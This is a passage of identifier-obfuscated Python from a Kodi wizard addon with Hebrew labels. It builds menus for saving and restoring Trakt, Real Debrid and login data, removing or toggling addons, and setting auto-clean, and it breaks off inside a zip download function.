	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0OO00OOO0OO0OO0O .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O00000OOOO0000000 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות:  '%O00O0O000O0O0OOOO .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OO0O0OO0O0OOO0000 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת מקורות וידאו:  '%OOOOOOOOOOOOOOO0O .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OOO00O0OOOO0O00OO .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O00O0OO000OO0O0O0 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת פליליסט לאודר:  '%OOO000O00000OOO0O .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת הגדרות באפר: '%OOO0OOO000OOO0000 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת רשימות ריפו:  '%O0OO0O000O00O0000 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3154
	setView ('files','viewType')#line:3156
def traktMenu ():#line:3158
	OO0OO0OOOO00OOO0O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3159
	O0O00OOOO0OO0OO00 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3160
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3161
	addFile ('Save Trakt Data: %s'%OO0OO0OOOO00OOO0O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3162
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0O00OOOO0OO0OO00 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3163
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3164
	for OO0OO0OOOO00OOO0O in traktit .ORDER :#line:3166
		OOO000O0O0OOO0O0O =TRAKTID [OO0OO0OOOO00OOO0O ]['name']#line:3167
		O0OO0OOOOO0O00O00 =TRAKTID [OO0OO0OOOO00OOO0O ]['path']#line:3168
		OOOOOO0OOO0OO0O00 =TRAKTID [OO0OO0OOOO00OOO0O ]['saved']#line:3169
		OO00OOOOO0OO0OO0O =TRAKTID [OO0OO0OOOO00OOO0O ]['file']#line:3170
		OO0OOO0OO0000O000 =wiz .getS (OOOOOO0OOO0OO0O00 )#line:3171
		OO0O0OOOO0000O00O =traktit .traktUser (OO0OO0OOOO00OOO0O )#line:3172
		OOOO0000O0O00OOOO =TRAKTID [OO0OO0OOOO00OOO0O ]['icon']if os .path .exists (O0OO0OOOOO0O00O00 )else ICONTRAKT #line:3173
		OOOO0O0OOO00OOO00 =TRAKTID [OO0OO0OOOO00OOO0O ]['fanart']if os .path .exists (O0OO0OOOOO0O00O00 )else FANART #line:3174
		OO0000O000O0OOO0O =createMenu ('saveaddon','Trakt',OO0OO0OOOO00OOO0O )#line:3175
		OO0000O00000OO00O =createMenu ('save','Trakt',OO0OO0OOOO00OOO0O )#line:3176
		OO0000O000O0OOO0O .append ((THEME2 %'%s Settings'%OOO000O0O0OOO0O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OO0OO0OOOO00OOO0O )))#line:3177
		addFile ('[+]-> %s'%OOO000O0O0OOO0O0O ,'',icon =OOOO0000O0O00OOOO ,fanart =OOOO0O0OOO00OOO00 ,themeit =THEME3 )#line:3179
		if not os .path .exists (O0OO0OOOOO0O00O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO0000O0O00OOOO ,fanart =OOOO0O0OOO00OOO00 ,menu =OO0000O000O0OOO0O )#line:3180
		elif not OO0O0OOOO0000O00O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OO0OO0OOOO00OOO0O ,icon =OOOO0000O0O00OOOO ,fanart =OOOO0O0OOO00OOO00 ,menu =OO0000O000O0OOO0O )#line:3181
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0O0OOOO0000O00O ,'authtrakt',OO0OO0OOOO00OOO0O ,icon =OOOO0000O0O00OOOO ,fanart =OOOO0O0OOO00OOO00 ,menu =OO0000O000O0OOO0O )#line:3182
		if OO0OOO0OO0000O000 =="":#line:3183
			if os .path .exists (OO00OOOOO0OO0OO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OO0OO0OOOO00OOO0O ,icon =OOOO0000O0O00OOOO ,fanart =OOOO0O0OOO00OOO00 ,menu =OO0000O00000OO00O )#line:3184
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OO0OO0OOOO00OOO0O ,icon =OOOO0000O0O00OOOO ,fanart =OOOO0O0OOO00OOO00 ,menu =OO0000O00000OO00O )#line:3185
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0OOO0OO0000O000 ,'',icon =OOOO0000O0O00OOOO ,fanart =OOOO0O0OOO00OOO00 ,menu =OO0000O00000OO00O )#line:3186
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3188
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3189
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3190
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3191
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3192
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3193
	setView ('files','viewType')#line:3194
def realMenu ():#line:3196
	O00O0OOO000OOO0OO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3197
	O0OOOOOO0OOO00O00 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3198
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3199
	addFile ('Save Real Debrid Data: %s'%O00O0OOO000OOO0OO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3200
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0OOOOOO0OOO00O00 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3201
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3202
	for O0000O0O00O0000OO in debridit .ORDER :#line:3204
		O0OOO0OOOOOOO0000 =DEBRIDID [O0000O0O00O0000OO ]['name']#line:3205
		OOOO00O0OOO0OO00O =DEBRIDID [O0000O0O00O0000OO ]['path']#line:3206
		O0O00000OO0O000OO =DEBRIDID [O0000O0O00O0000OO ]['saved']#line:3207
		O00O00OO0O0O0OOOO =DEBRIDID [O0000O0O00O0000OO ]['file']#line:3208
		O0OOOO0OO0O0OO000 =wiz .getS (O0O00000OO0O000OO )#line:3209
		O0OO0OO0OOOOOO000 =debridit .debridUser (O0000O0O00O0000OO )#line:3210
		OOO000000OOO00OO0 =DEBRIDID [O0000O0O00O0000OO ]['icon']if os .path .exists (OOOO00O0OOO0OO00O )else ICONREAL #line:3211
		O0000O0O00000O0O0 =DEBRIDID [O0000O0O00O0000OO ]['fanart']if os .path .exists (OOOO00O0OOO0OO00O )else FANART #line:3212
		O00OO00O0O0O000OO =createMenu ('saveaddon','Debrid',O0000O0O00O0000OO )#line:3213
		OOO00OO000O00000O =createMenu ('save','Debrid',O0000O0O00O0000OO )#line:3214
		O00OO00O0O0O000OO .append ((THEME2 %'%s Settings'%O0OOO0OOOOOOO0000 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0000O0O00O0000OO )))#line:3215
		addFile ('[+]-> %s'%O0OOO0OOOOOOO0000 ,'',icon =OOO000000OOO00OO0 ,fanart =O0000O0O00000O0O0 ,themeit =THEME3 )#line:3217
		if not os .path .exists (OOOO00O0OOO0OO00O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO000000OOO00OO0 ,fanart =O0000O0O00000O0O0 ,menu =O00OO00O0O0O000OO )#line:3218
		elif not O0OO0OO0OOOOOO000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0000O0O00O0000OO ,icon =OOO000000OOO00OO0 ,fanart =O0000O0O00000O0O0 ,menu =O00OO00O0O0O000OO )#line:3219
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OO0OO0OOOOOO000 ,'authdebrid',O0000O0O00O0000OO ,icon =OOO000000OOO00OO0 ,fanart =O0000O0O00000O0O0 ,menu =O00OO00O0O0O000OO )#line:3220
		if O0OOOO0OO0O0OO000 =="":#line:3221
			if os .path .exists (O00O00OO0O0O0OOOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0000O0O00O0000OO ,icon =OOO000000OOO00OO0 ,fanart =O0000O0O00000O0O0 ,menu =OOO00OO000O00000O )#line:3222
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0000O0O00O0000OO ,icon =OOO000000OOO00OO0 ,fanart =O0000O0O00000O0O0 ,menu =OOO00OO000O00000O )#line:3223
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOOO0OO0O0OO000 ,'',icon =OOO000000OOO00OO0 ,fanart =O0000O0O00000O0O0 ,menu =OOO00OO000O00000O )#line:3224
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3226
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3227
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3228
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3229
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3230
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3231
	setView ('files','viewType')#line:3232
def loginMenu ():#line:3234
	OO0O0OO000O0O00O0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3235
	OO0O00O000O0OOOO0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3236
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3237
	addFile ('Save Login Data: %s'%OO0O0OO000O0O00O0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3238
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OO0O00O000O0OOOO0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3239
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3240
	for OO0O0OO000O0O00O0 in loginit .ORDER :#line:3242
		O00OO0000OOO0OOOO =LOGINID [OO0O0OO000O0O00O0 ]['name']#line:3243
		O0O0OO0OO0OOOOOO0 =LOGINID [OO0O0OO000O0O00O0 ]['path']#line:3244
		O0OOO00OO00000OO0 =LOGINID [OO0O0OO000O0O00O0 ]['saved']#line:3245
		O0O0OO00OOO0OO00O =LOGINID [OO0O0OO000O0O00O0 ]['file']#line:3246
		O0O000O000O0OOO00 =wiz .getS (O0OOO00OO00000OO0 )#line:3247
		OOO0000O00O0O00O0 =loginit .loginUser (OO0O0OO000O0O00O0 )#line:3248
		OOOO000O0O000OO0O =LOGINID [OO0O0OO000O0O00O0 ]['icon']if os .path .exists (O0O0OO0OO0OOOOOO0 )else ICONLOGIN #line:3249
		O0OOOOO000O0O0OOO =LOGINID [OO0O0OO000O0O00O0 ]['fanart']if os .path .exists (O0O0OO0OO0OOOOOO0 )else FANART #line:3250
		OO0OO000O0O0OO000 =createMenu ('saveaddon','Login',OO0O0OO000O0O00O0 )#line:3251
		OO0OO0OO00OO0O0OO =createMenu ('save','Login',OO0O0OO000O0O00O0 )#line:3252
		OO0OO000O0O0OO000 .append ((THEME2 %'%s Settings'%O00OO0000OOO0OOOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OO0O0OO000O0O00O0 )))#line:3253
		addFile ('[+]-> %s'%O00OO0000OOO0OOOO ,'',icon =OOOO000O0O000OO0O ,fanart =O0OOOOO000O0O0OOO ,themeit =THEME3 )#line:3255
		if not os .path .exists (O0O0OO0OO0OOOOOO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO000O0O000OO0O ,fanart =O0OOOOO000O0O0OOO ,menu =OO0OO000O0O0OO000 )#line:3256
		elif not OOO0000O00O0O00O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OO0O0OO000O0O00O0 ,icon =OOOO000O0O000OO0O ,fanart =O0OOOOO000O0O0OOO ,menu =OO0OO000O0O0OO000 )#line:3257
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO0000O00O0O00O0 ,'authlogin',OO0O0OO000O0O00O0 ,icon =OOOO000O0O000OO0O ,fanart =O0OOOOO000O0O0OOO ,menu =OO0OO000O0O0OO000 )#line:3258
		if O0O000O000O0OOO00 =="":#line:3259
			if os .path .exists (O0O0OO00OOO0OO00O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OO0O0OO000O0O00O0 ,icon =OOOO000O0O000OO0O ,fanart =O0OOOOO000O0O0OOO ,menu =OO0OO0OO00OO0O0OO )#line:3260
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OO0O0OO000O0O00O0 ,icon =OOOO000O0O000OO0O ,fanart =O0OOOOO000O0O0OOO ,menu =OO0OO0OO00OO0O0OO )#line:3261
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O000O000O0OOO00 ,'',icon =OOOO000O0O000OO0O ,fanart =O0OOOOO000O0O0OOO ,menu =OO0OO0OO00OO0O0OO )#line:3262
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3264
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3265
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3266
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3267
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3268
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3269
	setView ('files','viewType')#line:3270
def fixUpdate ():#line:3272
	if KODIV <17 :#line:3273
		OOOO000OO000O00O0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3274
		try :#line:3275
			os .remove (OOOO000OO000O00O0 )#line:3276
		except Exception as OO0O0000OOO00O0O0 :#line:3277
			wiz .log ("Unable to remove %s, Purging DB"%OOOO000OO000O00O0 )#line:3278
			wiz .purgeDb (OOOO000OO000O00O0 )#line:3279
	else :#line:3280
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3281
def removeAddonMenu ():#line:3283
	O0O000OOO000O00OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3284
	O00OOOOOOO0O00O00 =[];O000OO0OOO0000000 =[]#line:3285
	for OOO0000OO00OOO000 in sorted (O0O000OOO000O00OO ,key =lambda O0OO0OOOO000O000O :O0OO0OOOO000O000O ):#line:3286
		OOO000O00O0O00O00 =os .path .split (OOO0000OO00OOO000 [:-1 ])[1 ]#line:3287
		if OOO000O00O0O00O00 in EXCLUDES :continue #line:3288
		elif OOO000O00O0O00O00 in DEFAULTPLUGINS :continue #line:3289
		elif OOO000O00O0O00O00 =='packages':continue #line:3290
		O0OO0OOO0OOO0O0O0 =os .path .join (OOO0000OO00OOO000 ,'addon.xml')#line:3291
		if os .path .exists (O0OO0OOO0OOO0O0O0 ):#line:3292
			OO0O0O0OOO0O0O0OO =open (O0OO0OOO0OOO0O0O0 )#line:3293
			OO00O00000OOO000O =OO0O0O0OOO0O0O0OO .read ()#line:3294
			O0O00OOO00O000O0O =wiz .parseDOM (OO00O00000OOO000O ,'addon',ret ='id')#line:3295
			O0O0O00000O00O00O =OOO000O00O0O00O00 if len (O0O00OOO00O000O0O )==0 else O0O00OOO00O000O0O [0 ]#line:3297
			try :#line:3298
				OOO0OOO0O000O00OO =xbmcaddon .Addon (id =O0O0O00000O00O00O )#line:3299
				O00OOOOOOO0O00O00 .append (OOO0OOO0O000O00OO .getAddonInfo ('name'))#line:3300
				O000OO0OOO0000000 .append (O0O0O00000O00O00O )#line:3301
			except :#line:3302
				pass #line:3303
	if len (O00OOOOOOO0O00O00 )==0 :#line:3304
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3305
		return #line:3306
	if KODIV >16 :#line:3307
		O0OOOO0O0O0O0OOOO =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00OOOOOOO0O00O00 )#line:3308
	else :#line:3309
		O0OOOO0O0O0O0OOOO =[];OO00000OO0OOOOO00 =0 #line:3310
		OOOO0OOO000O0OOO0 =["-- Click here to Continue --"]+O00OOOOOOO0O00O00 #line:3311
		while not OO00000OO0OOOOO00 ==-1 :#line:3312
			OO00000OO0OOOOO00 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOO0OOO000O0OOO0 )#line:3313
			if OO00000OO0OOOOO00 ==-1 :break #line:3314
			elif OO00000OO0OOOOO00 ==0 :break #line:3315
			else :#line:3316
				OO0O0O00O0O00O0O0 =(OO00000OO0OOOOO00 -1 )#line:3317
				if OO0O0O00O0O00O0O0 in O0OOOO0O0O0O0OOOO :#line:3318
					O0OOOO0O0O0O0OOOO .remove (OO0O0O00O0O00O0O0 )#line:3319
					OOOO0OOO000O0OOO0 [OO00000OO0OOOOO00 ]=O00OOOOOOO0O00O00 [OO0O0O00O0O00O0O0 ]#line:3320
				else :#line:3321
					O0OOOO0O0O0O0OOOO .append (OO0O0O00O0O00O0O0 )#line:3322
					OOOO0OOO000O0OOO0 [OO00000OO0OOOOO00 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O00OOOOOOO0O00O00 [OO0O0O00O0O00O0O0 ])#line:3323
	if O0OOOO0O0O0O0OOOO ==None :return #line:3324
	if len (O0OOOO0O0O0O0OOOO )>0 :#line:3325
		wiz .addonUpdates ('set')#line:3326
		for OOO0000OOOO0O0O00 in O0OOOO0O0O0O0OOOO :#line:3327
			removeAddon (O000OO0OOO0000000 [OOO0000OOOO0O0O00 ],O00OOOOOOO0O00O00 [OOO0000OOOO0O0O00 ],True )#line:3328
		xbmc .sleep (1000 )#line:3330
		if INSTALLMETHOD ==1 :OOOO0OO0O0OO00O0O =1 #line:3332
		elif INSTALLMETHOD ==2 :OOOO0OO0O0OO00O0O =0 #line:3333
		else :OOOO0OO0O0OO00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3334
		if OOOO0OO0O0OO00O0O ==1 :wiz .reloadFix ('remove addon')#line:3335
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3336
def removeAddonDataMenu ():#line:3338
	if os .path .exists (ADDOND ):#line:3339
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3340
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3341
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3342
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3343
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3344
		O0O0O000000OOOOO0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3345
		for O0O00000O0O00OO00 in sorted (O0O0O000000OOOOO0 ,key =lambda OOO00OOO0OO0O0O0O :OOO00OOO0OO0O0O0O ):#line:3346
			OOO0O00O0OOO0OOOO =O0O00000O0O00OO00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3347
			OOO0OOO0O00000O00 =os .path .join (O0O00000O0O00OO00 .replace (ADDOND ,ADDONS ),'icon.png')#line:3348
			O00OO00OO000OOO00 =os .path .join (O0O00000O0O00OO00 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3349
			OOO00O0000O0O0O0O =OOO0O00O0OOO0OOOO #line:3350
			O0OO00O0000OOO0OO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3351
			for O000OO000OO00000O in O0OO00O0000OOO0OO :#line:3352
				OOO00O0000O0O0O0O =OOO00O0000O0O0O0O .replace (O000OO000OO00000O ,O0OO00O0000OOO0OO [O000OO000OO00000O ])#line:3353
			if OOO0O00O0OOO0OOOO in EXCLUDES :OOO00O0000O0O0O0O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOO00O0000O0O0O0O #line:3354
			else :OOO00O0000O0O0O0O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOO00O0000O0O0O0O #line:3355
			addFile (' %s'%OOO00O0000O0O0O0O ,'removedata',OOO0O00O0OOO0OOOO ,icon =OOO0OOO0O00000O00 ,fanart =O00OO00OO000OOO00 ,themeit =THEME2 )#line:3356
	else :#line:3357
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3358
	setView ('files','viewType')#line:3359
def enableAddons ():#line:3361
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3362
	OO0000O0000O0OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3363
	O000OO00OO0OOOO00 =0 #line:3364
	for OO00OOO00O000O00O in sorted (OO0000O0000O0OO0O ,key =lambda OOO0000OOO00O0OOO :OOO0000OOO00O0OOO ):#line:3365
		O0O0O0O0OO0000000 =os .path .split (OO00OOO00O000O00O [:-1 ])[1 ]#line:3366
		if O0O0O0O0OO0000000 in EXCLUDES :continue #line:3367
		if O0O0O0O0OO0000000 in DEFAULTPLUGINS :continue #line:3368
		OO00OO00OO0OOOO0O =os .path .join (OO00OOO00O000O00O ,'addon.xml')#line:3369
		if os .path .exists (OO00OO00OO0OOOO0O ):#line:3370
			O000OO00OO0OOOO00 +=1 #line:3371
			OO0000O0000O0OO0O =OO00OOO00O000O00O .replace (ADDONS ,'')[1 :-1 ]#line:3372
			OO0O00000OO0OO00O =open (OO00OO00OO0OOOO0O )#line:3373
			O0OOO0OO0O0OO0O0O =OO0O00000OO0OO00O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3374
			O00O0OO0OOO0OOO0O =wiz .parseDOM (O0OOO0OO0O0OO0O0O ,'addon',ret ='id')#line:3375
			O000O0OO00OOO0000 =wiz .parseDOM (O0OOO0OO0O0OO0O0O ,'addon',ret ='name')#line:3376
			try :#line:3377
				O00O000OOO0OO0OOO =O00O0OO0OOO0OOO0O [0 ]#line:3378
				OOOOO0000000OO0O0 =O000O0OO00OOO0000 [0 ]#line:3379
			except :#line:3380
				continue #line:3381
			try :#line:3382
				O0OOOOO000O00OOOO =xbmcaddon .Addon (id =O00O000OOO0OO0OOO )#line:3383
				O00OO0O00O0OOOOOO ="[COLOR green][Enabled][/COLOR]"#line:3384
				OOOOO00OOO00O0O0O ="false"#line:3385
			except :#line:3386
				O00OO0O00O0OOOOOO ="[COLOR red][Disabled][/COLOR]"#line:3387
				OOOOO00OOO00O0O0O ="true"#line:3388
				pass #line:3389
			OOOO0OO00O000O0O0 =os .path .join (OO00OOO00O000O00O ,'icon.png')if os .path .exists (os .path .join (OO00OOO00O000O00O ,'icon.png'))else ICON #line:3390
			O00OOOOOOOOO0000O =os .path .join (OO00OOO00O000O00O ,'fanart.jpg')if os .path .exists (os .path .join (OO00OOO00O000O00O ,'fanart.jpg'))else FANART #line:3391
			addFile ("%s %s"%(O00OO0O00O0OOOOOO ,OOOOO0000000OO0O0 ),'toggleaddon',OO0000O0000O0OO0O ,OOOOO00OOO00O0O0O ,icon =OOOO0OO00O000O0O0 ,fanart =O00OOOOOOOOO0000O )#line:3392
			OO0O00000OO0OO00O .close ()#line:3393
	if O000OO00OO0OOOO00 ==0 :#line:3394
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3395
	setView ('files','viewType')#line:3396
def changeFeq ():#line:3398
	OO0O00OO0O0OO00O0 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3399
	OOO0O0O000OOOOOO0 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OO0O00OO0O0OO00O0 )#line:3400
	if not OOO0O0O000OOOOOO0 ==-1 :#line:3401
		wiz .setS ('autocleanfeq',str (OOO0O0O000OOOOOO0 ))#line:3402
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OO0O00OO0O0OO00O0 [OOO0O0O000OOOOOO0 ]))#line:3403
def developer ():#line:3405
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3406
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3407
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3408
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3409
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3410
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3411
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3412
	setView ('files','viewType')#line:3414
def download (O000OO0O0O00O00O0 ,O0OO0OOOO0OO00OO0 ):#line:3419
  OO0OO0OOO0O00O0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3420
  OOO0000000O00OOO0 =xbmcgui .DialogProgress ()#line:3421
  OOO0000000O00OOO0 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3422
  OO00OO00O000O0OOO =os .path .join (OO0OO0OOO0O00O0O0 ,'isr.zip')#line:3423
  O00O0O00OO000O0O0 =urllib2 .Request (O000OO0O0O00O00O0 )#line:3424
  O0OO00OO000OO000O =urllib2 .urlopen (O00O0O00OO000O0O0 )#line:3425
  O0OOO00O00000OOO0 =xbmcgui .DialogProgress ()#line:3427
  O0OOO00O00000OOO0 .create ("Downloading","Downloading "+name )#line:3428
  O0OOO00O00000OOO0 .update (0 )#line:3429
  OOOOO0OOOO000OOOO =O0OO0OOOO0OO00OO0 #line:3430
  O0O00OO00000000O0 =open (OO00OO00O000O0OOO ,'wb')#line:3431
  try :#line:3433
